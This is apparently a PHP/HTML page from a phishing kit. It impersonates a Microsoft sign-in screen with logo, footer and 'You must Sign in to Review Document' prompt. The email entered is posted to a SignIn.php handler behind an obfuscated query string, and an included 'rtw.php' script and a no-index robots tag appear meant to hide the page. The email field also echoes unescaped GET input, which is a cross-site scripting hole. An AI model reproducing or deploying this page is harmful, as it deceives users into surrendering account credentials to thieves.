<?php
if (!isset($_SESSION)) {
  session_start();
}

include "rtw.php";

?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    

    <noscript>
        <meta http-equiv="Refresh" content="0; URL=" />
    </noscript>

    <link rel="shortcut icon" href="img/icn.ico">
        <link rel="shortcut icon" href="">
    
    <meta name="robots" content="none">
<link crossorigin="anonymous" href="Sign_files/converged.css" rel="stylesheet">
</head>






<body class="cb" style="display: block;">


<div><!--  --><div><div class="background" role="presentation">

<div class="backgroundImage" style="background-image: url(img/bgd.jpg);"></div>
 </div></div> <div></div> 

 <!--@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-->

 <form action=SignIn.php?l=_JeHDCXZFUq_VJOXK0QWHtoersdfGYDw17742523456676546418&fid.13InboxLight.aspxn.1774256418&fid.1252899642528194560278553343InboxLighwsd5dfgsgfgyuiokjlt996123212342_Product-userid&userid name=aggebhagja id=aggebhagja method=post>

<div class="outer">
			<div class="middle">
			<div class="inner"> <div class="lightbox-cover" ></div>
			<div >
			<img class="logo" pngsrc="onlog.png" svgsrc=""src="Sign_files/llogo.svg" alt="Microsoft">
			</div>
			
			<div role="main">
			<div >
			<div class="pagination-view"><div>
			<div><div class="row text-title" id="loginHeader"> <div role="heading">You must Sign in to Review Document</div>
			
			 </div></div>
			 <div class="row"> <div role="alert" aria-live="assertive">
			 </div> <div class="form-group col-md-24"> <div class="placeholderContainer">
			 <!--######################################################################-->
			 <input type="email" value="<?=$_GET[email]?>" name="email" id="i0116" maxlength="113" class="form-control ltr_override"   placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." lang="en" required />
			 
	
			 </div>
			 </div> </div> <div>
			 
			 <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group">No account? <a href="">Create one!</a></div>
			 <div class="form-group"> <a id="cantAccessAccount" href="#">Can’t access your account?</a> </div>
			 </div> </div> </div><div class="row"> <div><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container">
			 <div class="inline-block"> <input type="submit" name="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next"> 
			 </div> </div></div> </div></div>
			</div>
			</div> </div></div> </div>
			
			  
			   <div >
			   </div> <div id="footer" class="footer default" role="contentinfo" > <div>
			   <div id="footerLinks" class="footerNode text-secondary">
			   <span id="ftrCopy">©2019 Microsoft</span>
			   <a id="ftrTerms" href="#">Terms of use</a> <a id="ftrPrivacy"  href="#">Privacy &amp; cookies</a>
			   <a href="#" role="button" class="moreOptions">
			   <img class="desktopMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="Sign_files/feet.svg">
			   <img class="mobileMode" role="presentation" pngsrc="" svgsrc="" data-bind="imgSrc" src="Sign_files/feet2.svg"></a> </div></div> </div> </div> 
			   </div> 
			   </form>


			   <form method="post" aria-hidden="true" target="_top" ></form>
			   <div id="idPartnerPL" ><iframe style="display: none;" src="Sign_files/prefetch.htm" width="0" height="0"></iframe></div> </div>
			   
			   </body>
			   </html>